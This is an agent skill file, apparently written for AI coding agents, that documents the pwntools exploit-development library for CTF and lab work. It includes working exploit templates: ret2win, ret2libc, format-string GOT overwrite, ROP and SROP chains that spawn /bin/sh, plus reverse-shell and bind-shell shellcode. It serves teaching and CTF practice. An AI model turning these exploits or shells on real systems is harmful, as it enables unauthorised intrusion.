---
name: pwntools
description: >
  Build, extend, and operate pwntools — a CTF framework and exploit development library for
  Python. Use when writing binary exploits, solving CTF pwn challenges, building ROP chains,
  crafting shellcode, or analyzing ELF binaries. Covers installation, core modules (process,
  remote, ELF, ROP, fmtstr, shellcraft, DynELF), packing/unpacking helpers, cyclic pattern
  generation, GDB integration, and complete CTF exploit patterns including buffer overflow,
  format string, ret2libc, and SROP.
license: MIT
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/Gallopsled/pwntools
  language: Python
---

# pwntools Agent Skill

## When to Use This Skill

Use this skill when:
- Writing or debugging binary exploits for CTF challenges or lab environments
- The user asks about pwntools, pwn, or exploit development in Python
- Building ROP chains, format string exploits, shellcode, or ret2libc attacks
- Analyzing ELF binaries programmatically (symbols, GOT, PLT, checksec)
- Automating GDB-assisted exploit development
- Resolving remote libc offsets dynamically via DynELF

## What pwntools Does

pwntools is a Python library purpose-built for exploit development and CTF competition. It
abstracts the low-level details of process interaction, binary parsing, shellcode generation,
and ROP chain construction into a clean API. It is the de facto standard for CTF pwn challenges
and is widely used in professional exploit research for prototyping.

## Installation

```bash
# Standard install (Python 3, recommended)
pip install pwntools

# With all optional dependencies (capstone, ROPgadget, unicorn)
pip install pwntools[extras]

# Kali / Debian
sudo apt install python3-pwntools

# From source (latest development)
git clone https://github.com/Gallopsled/pwntools
cd pwntools && pip install -e .

# Verify
python3 -c "import pwn; print(pwn.__version__)"
```

## Core Concepts

### Context

`context` is a global object controlling architecture, OS, log verbosity, and endianness.
Always set it before any packing or shellcode operations.

```python
from pwn import *

context.arch    = 'amd64'    # 'i386', 'arm', 'aarch64', 'mips', 'powerpc'
context.os      = 'linux'    # 'windows', 'freebsd'
context.endian  = 'little'   # 'big'
context.log_level = 'debug'  # 'info', 'warning', 'error', 'critical'
context.terminal  = ['tmux', 'splitw', '-h']  # for gdb.attach()

# Set multiple at once
context(arch='amd64', os='linux', log_level='info')
```

### Tubes: process and remote

All I/O goes through tube objects. They share the same API regardless of connection type.

```python
# Local process
p = process('./vuln')
p = process(['./vuln', 'arg1'], env={'LD_PRELOAD': './libc.so.6'})

# Remote TCP connection
p = remote('pwn.challenge.ctf', 1337)

# SSH
s = ssh(host='ctf.example.com', user='user', password='pass', port=22)
p = s.process('./vuln')

# Read operations
p.recv(n)          # receive exactly n bytes
p.recvline()       # receive until \n
p.recvuntil(b'> ') # receive until delimiter (consumes delimiter)
p.recvall()        # receive until EOF
p.clean()          # receive all pending data (non-blocking)

# Send operations
p.send(data)       # send raw bytes
p.sendline(data)   # send + \n
p.sendafter(b'> ', payload)    # wait for prompt, then send
p.sendlineafter(b'> ', payload)

# Interactive shell
p.interactive()

# Clean shutdown
p.close()
```

## Packing and Unpacking

```python
# Pack integers to bytes (respects context.arch endianness)
p8(0x41)           # b'A'
p16(0x4141)
p32(0xdeadbeef)    # little-endian: b'\xef\xbe\xad\xde'
p64(0xdeadbeefcafebabe)

# Force endianness regardless of context
p32(0xdeadbeef, endian='big')

# Unpack bytes to integers
u8(b'\x41')
u16(b'\x41\x41')
u32(b'\xef\xbe\xad\xde')   # 0xdeadbeef
u64(b'\xbe\xba\xfe\xca\xef\xbe\xad\xde')

# Pack lists of values
flat([0xdeadbeef, 0xcafebabe])         # concatenates p32 of each
flat({0x18: 0xdeadbeef})              # offset-based: pad to 0x18, then value

# String helpers
cyclic(100)         # generate 100-byte De Bruijn sequence
cyclic_find(0x6161616c)  # find offset of pattern in sequence
```

## ELF Binary Analysis

```python
elf = ELF('./vuln')

# Checksec
elf.checksec()
# Prints: RELRO, Stack Canary, NX, PIE, RPATH, etc.

# Symbols and addresses
elf.symbols['main']        # address of main
elf.functions['vuln']      # Function object with .address, .size
elf.got['puts']            # GOT entry for puts
elf.plt['puts']            # PLT stub for puts

# Sections and segments
elf.bss()                  # address of .bss section
elf.bss(offset)            # bss + offset
elf.section('.data')       # bytes of .data section

# String searching
next(elf.search(b'/bin/sh'))        # find /bin/sh in binary
next(elf.search(b'\x90\x90'))       # find NOP sled

# Patching and saving
elf.address = 0x400000     # set base address (for PIE rebasing)
elf.save('./vuln_patched')

# Libc
libc = ELF('./libc-2.31.so')
libc.symbols['system']
libc.symbols['__free_hook']
libc.search(b'/bin/sh').__next__()
```

## ROP Chain Building

```python
elf  = ELF('./vuln')
rop  = ROP(elf)

# Find gadgets
rop.find_gadget(['pop rdi', 'ret'])   # returns Gadget or None
rop.rdi                               # shorthand for pop rdi ; ret gadget
rop.ret                               # lone ret gadget (stack alignment)

# Build chain by calling functions
rop.puts(elf.got['puts'])             # call puts(got['puts'])
rop.system(next(elf.search(b'/bin/sh')))

# Raw gadget addresses
rop.raw(gadget_addr)
rop.raw(p64(value))

# Serialize chain
chain = rop.chain()                   # bytes ready to send

# Dump for debugging
print(rop.dump())

# Multi-binary ROP (e.g. ret2libc after leak)
libc = ELF('./libc.so.6')
libc.address = leaked_base
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))
```

## Shellcode Generation (shellcraft)

```python
# Generate shellcode for current context.arch
shellcraft.sh()                  # execve /bin/sh
shellcraft.cat('/flag')          # read and print file
shellcraft.connect('127.0.0.1', 4444)   # reverse shell
shellcraft.listen(4444)                  # bind shell

# Assemble to bytes
payload = asm(shellcraft.sh())

# Custom assembly
payload = asm('''
    xor rdi, rdi
    push rdi
    mov rbx, 0x68732f6e69622f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
''')

# Disassemble bytes
print(disasm(b'\x48\x31\xff\x57'))

# NASM-style asm with labels
payload = asm('''
start:
    jmp end
end:
    nop
''')
```

## Format String Exploitation

```python
# Automatic format string exploit
# autofmt: find offset, calculate writes, generate payload
fmt = FmtStr(execute_fmt=send_payload)

# Manual offset
autofmt = fmtstr_payload(offset=6, writes={target_addr: value})
autofmt = fmtstr_payload(offset=6, writes={
    elf.got['printf']: elf.plt['system']
})

# FmtStr class usage
def send_payload(payload):
    p.sendlineafter(b'> ', payload)
    return p.recvline()

fmt = FmtStr(execute_fmt=send_payload)
fmt.write(elf.got['printf'], elf.plt['system'])
fmt.execute_writes()
```

## Cyclic Pattern Generation

```python
# Generate De Bruijn sequence (for offset finding)
pattern = cyclic(200)           # 200-byte pattern
p.sendline(pattern)

# After crash (e.g. in GDB), find offset from crash value
offset = cyclic_find(0x6161616c)          # from hex crash value
offset = cyclic_find(b'laaa')             # from bytes
# Or from core dump:
core = Coredump('./core')
offset = cyclic_find(core.rsp)            # for stack smash (amd64)
offset = cyclic_find(core.eip)            # for i386
```

## GDB Integration

```python
# Attach GDB to running process (requires tmux or X11)
context.terminal = ['tmux', 'splitw', '-h']
p = process('./vuln')
gdb.attach(p)                             # attach with no commands
gdb.attach(p, '''
    break *main+42
    continue
''')

# Launch directly under GDB
p = gdb.debug('./vuln', '''
    break main
    continue
''')

# gdbscript as string or file
gdb.attach(p, gdbscript='set follow-fork-mode child\ncontinue\n')
```

## DynELF — Remote Libc Resolution

Use when you have an arbitrary read primitive but no libc leak.

```python
def leak(address):
    payload  = b'A' * offset
    payload += p64(rop_read_gadget)
    payload += p64(address)
    p.sendline(payload)
    return p.recv(8)

d = DynELF(leak, elf=ELF('./vuln'))
system_addr = d.lookup('system', 'libc')
```

## Common CTF Exploit Patterns

### Buffer Overflow (ret2win)

```python
from pwn import *

elf = ELF('./vuln')
p   = process('./vuln')

offset = 40                              # found via cyclic/gdb
payload  = b'A' * offset
payload += p64(elf.symbols['win'])       # overwrite return address

p.sendlineafter(b'> ', payload)
p.interactive()
```

### ret2libc (with puts leak)

```python
from pwn import *

elf  = ELF('./vuln')
libc = ELF('./libc-2.31.so')
rop  = ROP(elf)
p    = process('./vuln')

offset = 40

# Stage 1: leak puts address via puts(got['puts'])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gad = rop.find_gadget(['ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])      # return to main for stage 2

p.sendlineafter(b'> ', payload)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'Leaked puts: {hex(leaked_puts)}')

# Calculate libc base
libc.address = leaked_puts - libc.symbols['puts']
log.info(f'Libc base: {hex(libc.address)}')

# Stage 2: system('/bin/sh')
rop2 = ROP(libc)
payload2  = b'A' * offset
payload2 += p64(ret_gad)                 # 16-byte stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])

p.sendlineafter(b'> ', payload2)
p.interactive()
```

### Format String GOT Overwrite

```python
from pwn import *

elf = ELF('./vuln')
p   = process('./vuln')

def send_fmt(payload):
    p.sendlineafter(b'> ', payload)
    return p.recvline()

fmt    = FmtStr(execute_fmt=send_fmt)
fmt.write(elf.got['printf'], elf.plt['system'])
fmt.execute_writes()
p.sendlineafter(b'> ', b'/bin/sh\x00')
p.interactive()
```

### ROP Chain (execve syscall)

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)
p   = process('./vuln')

binsh = next(elf.search(b'/bin/sh'))
rop.rax(59)                  # syscall number for execve
rop.rdi(binsh)
rop.rsi(0)
rop.rdx(0)
rop.syscall()

payload = flat({offset: rop.chain()})
p.sendline(payload)
p.interactive()
```

## Advanced Techniques

### SROP (Sigreturn-Oriented Programming)

```python
from pwn import *
context.arch = 'amd64'
p = process('./srop_vuln')
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = 0x601000          # address of '/bin/sh\x00' in binary
frame.rsp = 0x601100
frame.rip = 0x400400          # syscall gadget
payload  = b'A' * offset
payload += p64(syscall_gadget)
payload += bytes(frame)
p.sendline(payload)
```

### One-Gadget Integration

```python
# $ one_gadget ./libc-2.31.so  → 0xe6aef, 0xe6af2, 0xe6af5
one_gadgets = [0xe6aef, 0xe6af2, 0xe6af5]
for og in one_gadgets:
    libc.address = libc_base
    payload = flat({offset: libc.address + og})
    p.sendline(payload)
```

## Integration with Other Tools

### ROPgadget / ropper

```bash
# Find gadgets to manually supplement ROP() object
ROPgadget --binary ./vuln --rop --depth 5
ropper -f ./vuln --search "pop rdi"
```

### patchelf + custom libc

```bash
# Test exploit against specific libc version
patchelf --set-interpreter ./ld-2.31.so ./vuln
patchelf --replace-needed libc.so.6 ./libc-2.31.so ./vuln
python3 exploit.py
```

### GDB + pwndbg / peda

```python
# Set pwndbg/peda as default in ~/.gdbinit
# pwntools will use it automatically via gdb.attach()
context.terminal = ['tmux', 'splitw', '-h', '-l', '120']
```

## Troubleshooting

| Issue | Fix |
|---|---|
| `EOFError` on recv | Process crashed — check payload for alignment issues |
| Stack alignment crash | Add `p64(ret_gadget)` before first function call in ROP |
| Wrong offsets after PIE | Subtract `elf.load_addr` or use `elf.address` rebasing |
| `context.arch` not set | packing/shellcraft silently defaults to i386 |
| GDB not attaching | Set `context.terminal` to your terminal emulator |
| Format string offset wrong | Brute-force: `fmtstr_offset(send_fmt, start_offset=1)` |
| `ROP` finds no gadgets | Binary may be stripped; supply additional ELFs to `ROP([elf, libc])` |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
